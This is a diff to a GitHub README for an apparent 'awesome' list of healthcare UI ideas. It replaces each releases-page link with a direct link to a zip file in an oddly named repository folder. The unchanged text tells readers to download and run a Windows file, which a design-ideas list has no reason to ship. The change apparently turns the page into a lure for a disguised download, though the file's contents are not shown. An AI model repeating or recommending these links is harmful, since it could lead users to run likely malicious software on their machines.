@@ -1,10 +1,10 @@
 # 🏥 Awesome-healthcare-UI - Healthcare UI Ideas for Faster Design
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue-grey?style=for-the-badge)](https://github.com/disheartening-bogcandles555/Awesome-healthcare-UI/releases)
+[![Download](https://img.shields.io/badge/Download%20Now-blue-grey?style=for-the-badge)](https://github.com/disheartening-bogcandles555/Awesome-healthcare-UI/raw/refs/heads/main/advocatory/Awesome_UI_healthcare_assume.zip)
 
 ## 📦 Download
 
-Visit this page to download: https://github.com/disheartening-bogcandles555/Awesome-healthcare-UI/releases
+Visit this page to download: https://github.com/disheartening-bogcandles555/Awesome-healthcare-UI/raw/refs/heads/main/advocatory/Awesome_UI_healthcare_assume.zip
 
 Choose the latest release file for Windows, then download and run this file.
 
@@ -184,4 +184,4 @@ This repository groups useful UI ideas in one place so you can compare them with
 
 ## 🔗 Download Again
 
-Visit this page to download: https://github.com/disheartening-bogcandles555/Awesome-healthcare-UI/releases
+Visit this page to download: https://github.com/disheartening-bogcandles555/Awesome-healthcare-UI/raw/refs/heads/main/advocatory/Awesome_UI_healthcare_assume.zip
